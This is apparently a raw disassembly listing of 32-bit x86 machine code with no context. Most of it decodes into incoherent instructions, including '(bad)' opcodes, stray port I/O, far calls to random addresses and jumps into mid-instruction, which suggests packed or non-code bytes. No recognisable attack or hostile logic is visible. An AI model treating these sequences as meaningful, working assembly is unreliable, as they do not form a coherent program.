  40d5aa:	out    0x87,al
  40d5ac:	loopne 0x40d5fd
  40d5ae:	dec    BYTE PTR [ebp+eax*4+0x0]
  40d5b5:	add    ah,dh
  40d5b7:	js     0x40d5b6
  40d5b9:	dec    DWORD PTR [esi+eiz*2+0xdcfd66]
  40d5c0:	test   eax,eax
  40d5c2:	ret    
  40d5c3:	adc    edi,DWORD PTR [edi+0x8f58c84]
  40d5c9:	xor    ebx,DWORD PTR [eax+eiz*8+0x79248588]
  40d5d0:	std    
  40d5d1:	jmp    DWORD PTR [ecx]
  40d5d3:	add    eax,0x7b33f9f7
  40d5d8:	dec    esi
  40d5d9:	dec    DWORD PTR [ebx+0x38fc337b]
  40d5df:	aas    
  40d5e0:	add    BYTE PTR [ebx+0x43dca0c1],al
  40d5e6:	mov    esi,?
  40d5e8:	(bad)  
  40d5e9:	adc    eax,0x3e8c2c
  40d5ee:	cmp    eax,0x8c43e4fe
  40d5f3:	mov    ch,0xc1
  40d5f5:	je     0x40d57b
  40d5f7:	int    0x4f
  40d5f9:	dec    DWORD PTR [ecx-0x64]
  40d5fc:	adc    DWORD PTR [eax+0x5c],eax
  40d5ff:	push   0x4c5b40
  40d604:	lea    ecx,[ebp-0x283b4]
  40d60a:	and    al,0x38
  40d60c:	sbb    al,BYTE PTR [edx]
  40d60e:	jne    0x40d5a9
  40d610:	jne    0x40d59e
  40d612:	cmp    eax,0x4dfe87b3
  40d617:	outs   dx,DWORD PTR ds:[esi]
  40d618:	jmp    0x40d61b
  40d61a:	add    BYTE PTR [eax],al
  40d61c:	add    BYTE PTR [eax],al
  40d61e:	add    BYTE PTR [ebp+0x2f],dh
  40d621:	lock mov eax,?
  40d624:	addr16 mov bh,dh
  40d627:	and    ch,dl
  40d629:	sbb    eax,0x7be6e800
  40d62e:	mov    dh,BYTE PTR [esi]
  40d630:	jb     0x40d629
  40d632:	mov    al,ds:0xbf7d9974
  40d637:	add    edx,0x75
  40d63a:	je     0x40d659
  40d63c:	inc    edx
  40d63d:	push   ecx
  40d63e:	push   edx
  40d640:	cdq    
  40d641:	call   0x388d:0x29a3472
  40d648:	and    DWORD PTR [ebx],esi
  40d64a:	mov    esi,DWORD PTR [ebx-0x327b8ab7]
  40d650:	sub    eax,0x4125fe88
  40d655:	scas   al,BYTE PTR es:[edi]
  40d656:	sti    
  40d657:	jne    0x40d5f2
  40d659:	jge    0x40d61a
  40d65b:	push   0x26
  40d65d:	ret    
  40d65e:	xor    DWORD PTR [ebp-0x4acd06b2],0xffffffb3
  40d665:	jns    0x40d5eb
  40d667:	popf   
  40d668:	int    0x87
  40d66a:	(bad)  
  40d66b:	call   0x93346186
  40d670:	in     al,0x32
  40d672:	push   0x80029974
  40d677:	or     BYTE PTR [esi-0x66caed9e],0x7b
  40d67e:	xor    al,0x3d
  40d680:	lods   eax,DWORD PTR ds:[esi]
  40d681:	inc    edx
  40d682:	add    BYTE PTR [eax],al
  40d684:	add    BYTE PTR [eax],al
  40d686:	add    BYTE PTR [eax],al
  40d688:	clc    
  40d689:	adc    eax,0x9462f793
  40d68e:	xor    DWORD PTR [ebp-0x7816fe10],ecx
  40d694:	push   ebx
  40d695:	cmp    DWORD PTR [eax],0xffffff87
  40d698:	and    BYTE PTR [ebp+0x6b],dh
  40d69b:	cld    
  40d69c:	inc    eax
  40d69d:	or     ebp,0x34
  40d6a0:	call   0x33ce9721
  40d6a5:	sbb    DWORD PTR [eax],0xffffff87
  40d6a8:	inc    eax
  40d6a9:	jne    0x40d71e
  40d6ab:	hlt    
  40d6ac:	and    eax,DWORD PTR [ebx+0x1ff4cad]
  40d6b2:	jmp    0x28f2f3ba
  40d6b7:	add    eax,0xfc6b7575
  40d6bc:	add    BYTE PTR [ebx+0x7ce8348d],al
  40d6c2:	js     0x40d650
  40d6c4:	repz sbb BYTE PTR [eax],0x79
  40d6c8:	icebp  
  40d6c9:	stc    
  40d6ca:	jbe    0x40d653
  40d6cc:	jecxz  0x40d6ff
  40d6ce:	pop    esp
  40d6cf:	or     edx,0x42876589
  40d6d5:	ja     0x40d6fc
  40d6d7:	xor    al,0xa
  40d6d9:	push   cs
  40d6da:	in     eax,dx
  40d6db:	add    esi,DWORD PTR [ebp+0x75]
  40d6de:	xchg   ebx,eax
  40d6df:	test   dl,cl
  40d6e1:	add    BYTE PTR [ebp-0x64],0x87
  40d6e5:	pop    eax
  40d6e6:	out    0x3,eax
  40d6e8:	idiv   BYTE PTR [ebp+0x80dc]
  40d6ee:	add    BYTE PTR [eax],al
  40d6f0:	add    dl,ah
  40d6f2:	add    esp,ecx
  40d6f4:	jp     0x40d6a6
  40d6f6:	xor    DWORD PTR [ecx],edx
  40d6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6f9:	daa    
  40d6fa:	add    ecx,ebp
  40d6fc:	int3   
  40d6fd:	imul   eax,DWORD PTR [edx],0xd75430c
  40d703:	loope  0x40d71e
  40d705:	jne    0x40d68a
  40d707:	fild   DWORD PTR [edi-0x7c]
  40d70a:	ret    0x4ce8
  40d70d:	pop    eax
  40d70e:	add    al,0x0
  40d710:	jmp    0xe9c5668b
  40d715:	jmp    0x40d697
  40d717:	(bad)  
  40d718:	scas   eax,DWORD PTR es:[edi]
  40d719:	jbe    0x40d71d
  40d71b:	inc    eax
  40d71c:	xor    BYTE PTR [ebx+edi*2+0x5e],ah
  40d720:	aaa    
  40d721:	test   eax,0x37a05b02
  40d726:	xlat   BYTE PTR ds:[ebx]
  40d727:	mov    dl,ch
  40d729:	imul   DWORD PTR [ebp+0x17]
  40d72c:	sbb    al,BYTE PTR [esi+0x5d]
  40d72f:	push   ebp
  40d730:	sbb    ah,BYTE PTR [esi-0x2b]
  40d733:	mov    ah,BYTE PTR [esi+0x701fe099]
  40d739:	pop    ebx
  40d73a:	mov    DWORD PTR es:[esi],edi
  40d73d:	sub    DWORD PTR [edx-0x73],ebp
  40d740:	xor    bh,BYTE PTR [ecx+0x2]
  40d743:	test   BYTE PTR [ecx-0x164879fd],ch
  40d749:	jbe    0x40d74d
  40d74b:	push   edi
  40d74c:	ins    BYTE PTR es:[edi],dx
  40d74d:	test   DWORD PTR [edx-0x19],ebp
  40d750:	out    0x8f,eax
  40d752:	add    al,BYTE PTR [eax]
  40d754:	add    BYTE PTR gs:[eax],al
  40d757:	add    BYTE PTR [eax],al
  40d759:	add    BYTE PTR [esi+0x768e8410],dh
  40d75f:	add    al,BYTE PTR [eax]
  40d761:	jo     0x40d700
  40d763:	jb     0x40d6ed
  40d765:	mov    ah,0xf2
  40d767:	ins    BYTE PTR es:[edi],dx
  40d768:	add    DWORD PTR [edx],ebx
  40d76a:	push   cs
  40d76b:	in     al,dx
  40d76c:	add    al,0x74
  40d76e:	xor    eax,0xe964f7a
  40d773:	add    BYTE PTR [ebx-0x17],bl
  40d776:	jbe    0x40d7b5
  40d778:	ret    
  40d779:	ficomp WORD PTR [edx]
  40d77b:	xchg   bh,bh
  40d77d:	call   0xe5385cf8
  40d782:	gs in  al,0x8a
  40d785:	lods   al,BYTE PTR ds:[esi]
  40d786:	out    dx,al
  40d787:	xor    al,0x47
  40d789:	icebp  
  40d78a:	cld    
  40d78b:	iret   
  40d78c:	pop    ss
  40d78d:	add    BYTE PTR [edx+edi*1],ch
  40d790:	cld    
  40d791:	xor    esp,DWORD PTR [edx-0x5]
  40d794:	(bad)  
  40d795:	add    ecx,DWORD PTR [ecx]
  40d797:	xchg   ebp,eax
  40d798:	xchg   DWORD PTR [ebp+0x64],eax
  40d79b:	jae    0x40d810
  40d79d:	hlt    
  40d79e:	fild   WORD PTR [ebx+0x3]
  40d7a1:	add    DWORD PTR [edx],0x6
  40d7a4:	cmp    esi,DWORD PTR [ebp+0x38]
  40d7a7:	(bad)  
  40d7a9:	jb     0x40d7fc
  40d7ab:	dec    edx
  40d7ac:	pop    ebx
  40d7ad:	call   0x7c2925
  40d7b2:	sbb    al,0xe5
  40d7b4:	(bad)  
  40d7b5:	jbe    0x40d831
  40d7b7:	sbb    al,0x0
  40d7b9:	push   esi
  40d7ba:	jg     0x40d7b7
  40d7bc:	(bad)
  40d7bf:	add    BYTE PTR [eax],al
  40d7c1:	add    BYTE PTR [eax],al
  40d7c3:	adc    DWORD PTR [edx],ebp
  40d7c5:	add    BYTE PTR [eax],al
  40d7c7:	nop
  40d7c8:	inc    esi
  40d7c9:	jb     0x40d80e
  40d7cb:	(bad)  
  40d7cc:	aas    
  40d7cd:	and    BYTE PTR [ecx],al
  40d7cf:	xchg   ebp,eax
  40d7d0:	sub    eax,esi
  40d7d2:	mov    ecx,esi
  40d7d4:	nop
  40d7d5:	adc    DWORD PTR [edi-0x50],0x6845f604
  40d7dc:	add    eax,0x94f9075
  40d7e1:	clc    
  40d7e2:	add    BYTE PTR [edx+0x6447fdfa],dh
  40d7e8:	fwait
  40d7e9:	xor    DWORD PTR [ebx],0xffffff87
  40d7ec:	xor    edi,edi
  40d7ee:	jne    0x40d810
  40d7f0:	sti    
  40d7f1:	(bad)  
  40d7f4:	xchg   esp,eax
  40d7f5:	out    0xe2,al
  40d7f7:	(bad)  
  40d7f8:	add    al,0x0
  40d7fa:	test   BYTE PTR [edx+edx*1+0x10],cl
  40d7fe:	jmp    DWORD PTR [ebx-0x71a3ec7b]
  40d804:	(bad)  
  40d805:	inc    DWORD PTR [esp+ebx*2+0x75b00412]
  40d80c:	push   0xffffff97
  40d80e:	add    DWORD PTR [edi+0x2b],eax
  40d811:	es pop ebx
  40d813:	cmp    al,0x2d
  40d815:	jns    0x40d81c
  40d817:	test   BYTE PTR [ecx],0x85
  40d81a:	jae    0x40d88a
  40d81c:	out    dx,al
  40d81d:	ret    
  40d81e:	jae    0x40d892
  40d820:	cdq    
  40d821:	adc    DWORD PTR [ecx+edx*4],0x7b
  40d825:	inc    edx
  40d826:	add    BYTE PTR [eax],al
  40d828:	add    BYTE PTR [eax],al
  40d82a:	add    BYTE PTR [eax],al
  40d82c:	(bad)  
  40d82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d82e:	call   0x4d56:0x2699ccc
  40d835:	and    DWORD PTR [ebx+0x0],ecx
  40d838:	jne    0x40d82e
  40d83a:	mov    esp,0x2d17c4c2
  40d83f:	push   0x65
  40d841:	inc    ecx
  40d842:	loopne 0x40d7fc
  40d844:	je     0x40d8af
  40d846:	jge    0x40d807
  40d848:	mov    DWORD PTR [edi],eax
  40d84a:	jns    0x40d897
  40d84c:	push   ecx
  40d84d:	jne    0x40d8ce
  40d84f:	pop    es
  40d850:	add    ch,ch
  40d852:	cmp    cl,BYTE PTR [eax]
  40d854:	cli    
  40d855:	in     al,dx
  40d856:	cmp    cl,BYTE PTR [edx+esi*8]
  40d859:	in     al,dx
  40d85a:	and    dl,BYTE PTR [eax]
  40d85c:	jne    0x40d84a
  40d85e:	and    dl,BYTE PTR [esi*2-0x11e7c51e]
  40d865:	stc    
  40d866:	xchg   edi,eax
  40d867:	add    DWORD PTR [esi+0x40f57ddf],eax
  40d86d:	gs iret 
  40d86f:	mov    edi,0x437773ce
  40d874:	xchg   ecx,eax
  40d875:	jns    0x40d8ee
  40d877:	std    
  40d878:	cld    
  40d879:	outs   dx,DWORD PTR ds:[esi]
  40d87a:	call   0xb583:0x8440abb7
  40d881:	mov    esi,0x3107e7fb
  40d886:	test   dh,bh
  40d888:	sahf   
  40d889:	add    cl,BYTE PTR ds:0xbedfb078
  40d88f:	sub    al,BYTE PTR [eax]
  40d891:	add    BYTE PTR [eax],al
  40d893:	add    BYTE PTR [eax],al
  40d895:	mov    bh,0xa
  40d897:	jmp    0x69afc6ca
  40d89c:	xchg   edi,eax
  40d89d:	mov    dl,bl
  40d89f:	sahf   
  40d8a0:	jbe    0x40d853
  40d8a2:	push   cs
  40d8a3:	cdq    
  40d8a4:	test   cl,ch
  40d8a6:	push   cs
  40d8a7:	mov    edx,0x737fc7a8
  40d8ac:	sti    
  40d8ad:	pop    edx
  40d8ae:	enter  0x4cd,0x75
  40d8b2:	mov    DWORD PTR [ebx],esp
  40d8b4:	or     al,0x7e
  40d8b6:	inc    ebx
  40d8b7:	in     eax,0x87
  40d8b9:	adc    DWORD PTR [edx],eax
  40d8bb:	jmp    0x1a4577c3
  40d8c0:	xlat   BYTE PTR ds:[ebx]
  40d8c1:	inc    DWORD PTR [esi-0x30]
  40d8c4:	and    al,0xbf
  40d8c6:	add    ch,cl
  40d8c8:	xchg   edx,ebx
  40d8ca:	push   cs
  40d8cb:	mov    ss,WORD PTR gs:[edx]
  40d8ce:	jg     0x40d8b8
  40d8d0:	(bad)  
  40d8d2:	hlt    
  40d8d3:	nop
  40d8d4:	ins    BYTE PTR es:[edi],dx
  40d8d5:	xor    ecx,ebx
  40d8d7:	call   0x1482c9df
  40d8dc:	add    esi,edi
  40d8de:	(bad)  
  40d8df:	loopne 0x40d917
  40d8e1:	xor    BYTE PTR [edx],cl
  40d8e3:	jb     0x40d91e
  40d8e5:	xor    DWORD PTR [ecx+ebp*1],edx
  40d8e8:	add    al,0xec
  40d8ea:	les    esi,FWORD PTR [esi+ecx*4+0x3b]
  40d8ee:	sbb    bh,BYTE PTR [edx+0x6b7a318b]
  40d8f4:	leave  
  40d8f5:	mov    esi,0x8c2d1
  40d8fa:	add    BYTE PTR [eax],al
  40d8fc:	add    BYTE PTR [eax],al
  40d8fe:	call   0xb4152dc7
  40d903:	ss inc esi
  40d905:	pop    edx
  40d906:	icebp  
  40d907:	inc    ecx
  40d908:	mov    ah,0x42
  40d90a:	idiv   ah
  40d90c:	push   DWORD PTR [esp+ebp*2]
  40d90f:	cmc    
  40d910:	cmp    BYTE PTR [edx-0x46043a1b],bl
  40d916:	div    ebp
  40d918:	pop    es
  40d919:	push   ds
  40d91a:	jl     0x40d926
  40d91c:	(bad)  
  40d91d:	fdivrp st(7),st
  40d91f:	push   esp
  40d920:	test   BYTE PTR [ecx],ch
  40d922:	ins    DWORD PTR es:[edi],dx
  40d923:	sub    BYTE PTR [ebx+0x453b7eac],cl
  40d929:	std    
  40d92a:	pop    ebp
  40d92b:	and    BYTE PTR [ebx-0xfc6952],al
  40d931:	mov    dh,0x69
  40d933:	frstor [ebx]
  40d935:	out    0x3f,al
  40d937:	es push esp
  40d93a:	adc    BYTE PTR [eax],0x40
  40d93d:	jmp    0xc14cd039
  40d942:	inc    esp
  40d943:	mov    dh,0x0
  40d945:	jmp    0xa2bdc30
  40d94a:	dec    edx
  40d94b:	jge    0x40d9c1
  40d94d:	(bad)
  40d950:	(bad)  
  40d951:	xor    al,0xa1
  40d953:	gs xchg ebp,eax
  40d955:	inc    eax
  40d956:	jno    0x40d95a
  40d958:	call   esi
  40d95a:	not    DWORD PTR [esi]
  40d95c:	pop    esp
  40d95d:	sti    
  40d95e:	ss jle 0x40d95e
  40d961:	adc    al,0x0
  40d963:	add    BYTE PTR [eax],al
  40d965:	add    BYTE PTR [eax],al
  40d967:	test   DWORD PTR [edx+0x2b],ebp
  40d96a:	inc    ecx
  40d96b:	jno    0x40d96f
  40d96d:	xor    ch,BYTE PTR [ecx-0x5437272c]
  40d973:	outs   dx,BYTE PTR ds:[esi]
  40d974:	add    dl,BYTE PTR [ebp+0x62]
  40d977:	bound  eax,QWORD PTR [eax-0x775c0615]
  40d97d:	pop    ebp
  40d97e:	cmc    
  40d97f:	lahf   
  40d980:	mov    BYTE PTR [ebp-0x7],bh
  40d983:	dec    ebx
  40d984:	cmp    ebp,DWORD PTR [edx-0x1c]
  40d987:	add    eax,0xc00f7c7
  40d98c:	pop    esp
  40d98d:	out    0x81,al
  40d98f:	aad    0x1
  40d991:	add    BYTE PTR [ebx+0x38750a64],al
  40d997:	pop    ss
  40d998:	dec    edx
  40d999:	div    BYTE PTR [ebx]
  40d99b:	ficomp DWORD PTR [ecx]
  40d99d:	mov    cl,BYTE PTR [ebp+0x60]
  40d9a0:	aaa    
  40d9a1:	dec    esi
  40d9a2:	sbb    BYTE PTR [ecx],dl
  40d9a4:	push   ecx
  40d9a5:	add    ecx,DWORD PTR [ecx-0x5fe0eff]
  40d9ab:	in     eax,0x62
  40d9ad:	repnz cmp DWORD PTR [edi+0x1],0xffffff89
  40d9b2:	inc    ebp
  40d9b3:	mov    BYTE PTR fs:[ebx-0x4],cl
  40d9b7:	dec    edx
  40d9b8:	sar    edi,0x74
  40d9bb:	pop    eax
  40d9bc:	test   BYTE PTR [esi-0x190b68b],bh
  40d9c2:	push   edx
  40d9c3:	jnp    0x40d954
  40d9c5:	(bad)  
  40d9c6:	call   0x3f3340
  40d9cb:	add    BYTE PTR [eax],al
  40d9cd:	add    BYTE PTR [eax],al
  40d9cf:	add    BYTE PTR [eax+0x1eb773c6],bl
  40d9d5:	rcr    DWORD PTR [ebp+0x5b],0xd5
  40d9d9:	(bad)  
  40d9da:	mov    DWORD PTR [ebp-0x34],eax
  40d9dd:	mov    BYTE PTR [eax+ecx*1-0x79],al
  40d9e1:	inc    ebp
  40d9e2:	repnz mov DWORD PTR [edx+0x12],ebx
  40d9e6:	mov    DWORD PTR [esi-0x4],edi
  40d9e9:	xchg   DWORD PTR [esp+edx*1+0x4c],ebx
  40d9ed:	add    ebx,ebp
  40d9ef:	out    0x8d,al
  40d9f1:	pop    DWORD PTR [ebp+0x8]
  40d9f4:	addr16 push ebx
  40d9f6:	or     cl,BYTE PTR [ebx+0x53d126fc]
  40d9fc:	push   0xffffff87
  40d9fe:	clc    
  40d9ff:	jmp    FWORD PTR [eax-0x263f7e92]
  40da05:	outs   dx,BYTE PTR ds:[esi]
  40da06:	inc    BYTE PTR [edx+0x51043a75]
  40da0c:	inc    ebp
  40da0d:	loopne 0x40da57
  40da0f:	out    0x93,eax
  40da11:	mov    ds:0x2af90002,al
  40da16:	clc    
  40da17:	push   esp
  40da18:	out    dx,al
  40da19:	mov    ebx,0x630a2b12
  40da1e:	sub    ebp,0x70
  40da21:	mov    ebp,0x69ca586a
  40da26:	add    cl,BYTE PTR [ebx+0x735ced9d]
  40da2c:	mov    ch,0xe6
  40da2e:	jns    0x40daa8
  40da30:	js     0x40d9c1
  40da32:	xlat   BYTE PTR ds:[ebx]
  40da33:	inc    BYTE PTR [eax]
  40da35:	add    BYTE PTR [eax],al
  40da37:	add    BYTE PTR [eax],al
  40da39:	mov    BYTE PTR [ebp-0x178abfec],dh
  40da3f:	dec    ebx
  40da40:	(bad)  
  40da41:	pop    esi
  40da42:	(bad)  
  40da43:	fcom   DWORD PTR [edx-0x5e]
  40da46:	push   ecx
  40da47:	push   ebx
  40da48:	push   edi
  40da49:	jne    0x40dab4
  40da4b:	cmp    eax,esi
  40da4d:	shl    BYTE PTR [esi-0x14],0x0
  40da51:	xor    dl,dh
  40da53:	daa    
  40da54:	sbb    dh,bh
  40da56:	stos   DWORD PTR es:[edi],eax
  40da57:	mov    ecx,edx
  40da59:	or     eax,0x1aff6752
  40da5e:	loope  0x40da2e
  40da60:	and    esp,DWORD PTR [ebp-0x1e]
  40da63:	add    DWORD PTR [ebp-0x4ff7e1cb],eax
  40da69:	je     0x40d9fb
  40da6b:	or     dl,BYTE PTR [ebx+0xd]
  40da6e:	pop    ecx
  40da6f:	mov    bh,0x0
  40da71:	jne    0x40daca
  40da73:	inc    edx
  40da74:	pop    ebp
  40da75:	dec    esi
  40da76:	and    al,BYTE PTR [esi+0x7]
  40da79:	jne    0x40da91
  40da7b:	(bad)  
  40da7c:	jmp    0x40da6c
  40da7e:	cs or  al,0x83
  40da81:	loope  0x40dadc
  40da83:	ror    DWORD PTR [edx+0x24f50228],cl
  40da89:	mov    dh,0xd4
  40da8b:	imul   edi,DWORD PTR [ebx-0x45],0xb28a6d0b
  40da92:	jnp    0x40da7c
  40da94:	fdivr  st,st(1)
  40da96:	cmc    
  40da97:	cmp    BYTE PTR [ebx-0x5a],ch
  40da9a:	shr    eax,cl
  40da9c:	add    eax,DWORD PTR [eax]
  40da9e:	add    BYTE PTR [eax],al
  40daa0:	add    BYTE PTR [eax],al
  40daa2:	icebp  
  40daa3:	inc    edx
  40daa4:	mov    esp,0x34dd4fff
  40daa9:	clc    
  40daaa:	add    esi,eax
  40daac:	lock mov WORD PTR [ecx],?
  40daaf:	or     ah,dl
  40dab1:	(bad)  
  40dab2:	mov    ch,bh
  40dab4:	add    DWORD PTR [ecx+ebx*8-0x2e7b178e],0x76
  40dabc:	call   0x73bd3dae
  40dac1:	ja     0x40dab2
  40dac3:	inc    edx
  40dac4:	cmc    
  40dac5:	cmc    
  40dac6:	bound  ebp,QWORD PTR [edx-0x51]
  40dac9:	fisttp DWORD PTR [edx+0x7b]
  40dacc:	ins    BYTE PTR es:[edi],dx
  40dacd:	inc    esp
  40dace:	(bad)  
  40dacf:	rcl    BYTE PTR [edx+0x9],1
  40dad2:	call   0xcc15ab9b
  40dad7:	push   0x20
  40dad9:	fsubr  QWORD PTR [edx]
  40dadb:	jnp    0x40db46
  40dadd:	jl     0x40db58
  40dadf:	cmc    
  40dae0:	daa    
  40dae1:	mov    esp,DWORD PTR [ecx+0x6af6f97a]
  40dae7:	mov    BYTE PTR ds:0xa4c5451c,ah
  40daed:	mov    ebp,DWORD PTR [ecx-0x10bc25f6]
  40daf3:	dec    ebx
  40daf4:	jmp    0x13c9bdc9
  40daf9:	jl     0x40da82
  40dafb:	lds    edi,FWORD PTR [ebx+eax*4-0x4b]
  40daff:	add    al,0x6a
  40db01:	push   esp
  40db02:	fidivr DWORD PTR [ecx]
  40db04:	add    BYTE PTR [eax+eax*1],bl
  40db07:	add    BYTE PTR [eax],al
  40db09:	add    BYTE PTR [eax],al
  40db0b:	dec    ecx
  40db0c:	test   BYTE PTR [edi],0x62
  40db0f:	lods   al,BYTE PTR ds:[esi]
  40db10:	outs   dx,BYTE PTR ds:[esi]
  40db11:	cmp    bh,BYTE PTR [edx+esi*2-0x5b8fe60a]
  40db18:	push   0xffffff88
  40db1a:	lods   al,BYTE PTR ds:[esi]
  40db1b:	sub    bh,BYTE PTR [eax]
  40db1d:	inc    ebp
  40db1e:	frstor [ebx+0x5e897203]
  40db24:	int    0x7
  40db26:	mov    bh,0xff
  40db28:	xor    al,al
  40db2a:	xchg   edi,eax
  40db2b:	scas   eax,DWORD PTR es:[edi]
  40db2c:	dec    ecx
  40db2d:	shl    ecx,0x76
  40db30:	je     0x40db76
  40db32:	and    eax,0x64f1f578
  40db37:	add    ebp,edi
  40db39:	in     eax,dx
  40db3a:	bound  ebp,QWORD PTR [edx+ebp*2-0x78]
  40db3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db3f:	or     BYTE PTR [ebx-0x2f0e0e8a],0xb
  40db46:	jo     0x40db72
  40db48:	or     dh,BYTE PTR [eax+0x5456dfe8]
  40db4e:	(bad)  
  40db4f:	lds    ecx,FWORD PTR [ebp+eax*2+0xbc7eff1]
  40db56:	jb     0x40dafe
  40db58:	and    al,0xd1
  40db5a:	push   0xffffffa2
  40db5c:	or     DWORD PTR [ebx+0x76f5abd3],eax
  40db62:	push   ebx
  40db63:	jns    0x40db38
  40db65:	dec    edi
  40db66:	jb     0x40db18
  40db68:	popa   
  40db69:	popf   
  40db6a:	push   ds
  40db6b:	jns    0x40db6f
  40db6d:	test   BYTE PTR [ecx+0x0],ch
  40db73:	add    BYTE PTR [edx],al
  40db75:	loop   0x40dbe0
  40db77:	in     al,dx
  40db78:	in     eax,0xbe
  40db7a:	repz cmp DWORD PTR [ebx],esp
  40db7d:	bound  ebp,QWORD PTR [esi+edi*1-0x6e7cfd87]
  40db84:	jge    0x40db75
  40db86:	push   esi
  40db87:	add    BYTE PTR [edi+0x47],ah
  40db8a:	push   ss
  40db8b:	xor    DWORD PTR [ecx+0x504d2ffa],ecx
  40db91:	mov    ecx,edi
  40db93:	mov    bl,BYTE PTR ds:0xa6f84534
  40db99:	add    eax,0x9c876ff
  40db9e:	add    edi,edi
  40dba0:	ror    BYTE PTR ds:0x4a14c232,cl
  40dba6:	test   BYTE PTR [ebx+0x5761ed52],0x8c
  40dbad:	add    eax,0x32d0c084
  40dbb2:	push   0x0
  40dbb4:	sub    DWORD PTR [edx-0x6],ecx
  40dbb7:	push   eax
  40dbb8:	out    0xa,al
  40dbba:	lea    eax,[ebp+0x60]
  40dbbd:	push   ebp
  40dbbe:	std    
  40dbbf:	mov    ebx,DWORD PTR ss:[edx]
  40dbc2:	dec    esp
  40dbc3:	adc    bl,BYTE PTR [eax*1+0x1ae0c085]
  40dbca:	cmp    DWORD PTR [ebp+0x58],0x1
  40dbce:	jne    0x40dbdf
  40dbd0:	dec    ebx
  40dbd1:	dec    DWORD PTR cs:[esi+0x34]
  40dbd5:	clc    
  40dbd6:	adc    edi,DWORD PTR [eax+eax*1]
  40dbd9:	add    BYTE PTR [eax],al
  40dbdb:	add    BYTE PTR [eax],al
  40dbdd:	ds inc ebp
  40dbdf:	(bad)  
  40dbe0:	scas   eax,DWORD PTR es:[edi]
  40dbe1:	dec    ebp
  40dbe2:	int3   
  40dbe3:	shl    DWORD PTR [edx],0xdc
  40dbe6:	int3   
  40dbe7:	shl    esi,0x50
  40dbea:	sub    al,BYTE PTR [ecx+eax*1]
  40dbed:	or     BYTE PTR [ebx+0x3912c7ef],0x74
  40dbf4:	inc    eax
  40dbf5:	sbb    al,0x71
  40dbf7:	add    al,0x56
  40dbf9:	xor    al,0xb8
  40dbfb:	mov    bl,0x1
  40dbfd:	or     al,0x8a
  40dbff:	les    ebx,FWORD PTR [esi-0x32]
  40dc02:	or     DWORD PTR [eax],eax
  40dc04:	push   esi
  40dc05:	jne    0x40dbeb
  40dc07:	mul    DWORD PTR [ebx]
  40dc09:	jge    0x40dbef
  40dc0b:	add    eax,0x7cb0ee57
  40dc10:	dec    edi
  40dc11:	jno    0x40dbf1
  40dc13:	inc    ebx
  40dc14:	je     0x40dc8e
  40dc16:	in     al,dx
  40dc17:	dec    esp
  40dc18:	(bad)  
  40dc19:	ficomp WORD PTR [eax-0x18]
  40dc1c:	add    DWORD PTR ds:0x771d88d3,esp
  40dc22:	imul   eax,DWORD PTR [edi-0x8300709],0xf
  40dc29:	popf   
  40dc2a:	xchg   DWORD PTR [edx+eax*1],ebx
  40dc2d:	jne    0x40dc16
  40dc2f:	inc    ebx
  40dc30:	jae    0x40dca4
  40dc32:	hlt    
  40dc33:	add    eax,0xd42fc38b
  40dc38:	pop    es
  40dc39:	mul    BYTE PTR [edi]
  40dc3b:	jge    0x40dcb0
  40dc3d:	outs   dx,DWORD PTR ds:[esi]
  40dc3e:	out    0x7c,al
  40dc40:	jae    0x40dc42
  40dc42:	add    BYTE PTR [eax],al
  40dc44:	add    BYTE PTR [eax],al
  40dc46:	jae    0x40dbf8
  40dc48:	push   0xffffffb4
  40dc4a:	inc    esp
  40dc4b:	adc    DWORD PTR [ebp-0x76],edi
  40dc4e:	jae    0x40dbd3
  40dc50:	add    DWORD PTR [ebx+0x5f140133],ecx
  40dc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc57:	sub    esi,ebx
  40dc59:	sar    DWORD PTR [ecx+0x69],0xd5
  40dc5d:	mov    bl,BYTE PTR [ecx-0x65]
  40dc60:	ror    DWORD PTR [edx+0x7474e73d],cl
  40dc66:	jno    0x40dc83
  40dc68:	inc    esp
  40dc69:	jmp    0xc381:0x737be671
  40dc70:	add    edx,DWORD PTR [esi-0x73]
  40dc73:	add    BYTE PTR [ecx+0x3f],cl
  40dc76:	jne    0x40dc4b
  40dc78:	add    ebp,eax
  40dc7a:	pop    ss
  40dc7b:	das    
  40dc7c:	add    al,0x0
  40dc7e:	std    
  40dc7f:	push   ds
  40dc80:	jge    0x40dc6c
  40dc82:	data16 add bh,BYTE PTR [edi]
  40dc85:	in     al,dx
  40dc86:	cmp    ecx,DWORD PTR [ebx+0x28]
  40dc89:	add    al,0x5f
  40dc8b:	add    al,BYTE PTR [ecx-0x16fec4f8]
  40dc91:	xchg   BYTE PTR [edx],ah
  40dc93:	or     BYTE PTR [esi+eax*8-0x25],bl
  40dc97:	cmp    bl,0x7c
  40dc9a:	shr    dh,cl
  40dc9c:	loopne 0x40dc26
  40dc9e:	jo     0x40dc8c
  40dca0:	out    0x88,eax
  40dca2:	mov    al,0x77
  40dca4:	clc    
  40dca5:	mov    DWORD PTR [ecx],esi
  40dca7:	ja     0x40dc66
  40dca9:	dec    edx
  40dcaa:	add    BYTE PTR [eax],al
  40dcac:	add    BYTE PTR [eax],al
  40dcae:	add    BYTE PTR [edi+0x77f65e7d],dh
  40dcb4:	xor    ebp,DWORD PTR [ecx]
  40dcb6:	inc    eax
  40dcb7:	dec    ebx
  40dcb8:	in     al,dx
  40dcb9:	call   0xd10e77a7
  40dcbe:	cmp    al,0xbe
  40dcc0:	ret    0xe9e8
  40dcc3:	mov    ch,cl
  40dcc5:	call   0xfad74646
  40dcca:	ret    
  40dccb:	jp     0x40dc59
  40dccd:	and    BYTE PTR [esi-0x771f128d],al
  40dcd3:	jo     0x40dcc1
  40dcd5:	out    0x88,eax
  40dcd7:	xor    BYTE PTR [edi-0x28],dh
  40dcda:	mov    BYTE PTR [ebx],dh
  40dcdc:	xlat   BYTE PTR ds:[ebx]
  40dcdd:	sub    DWORD PTR [eax+0x436bfeb8],ecx
  40dce3:	(bad)  
  40dce4:	or     ebx,DWORD PTR [ecx-0x5719684]
  40dcea:	ret    
  40dceb:	cmp    al,BYTE PTR [esi+eax*2-0x11748b00]
  40dcf2:	sub    dl,0xed
  40dcf5:	loop   0x40dcca
  40dcf7:	and    ecx,DWORD PTR ds:0x2b516ed
  40dcfd:	push   0x22
  40dcff:	jne    0x40dd44
  40dd01:	inc    DWORD PTR [eax+0x61]
  40dd04:	add    eax,DWORD PTR [eax]
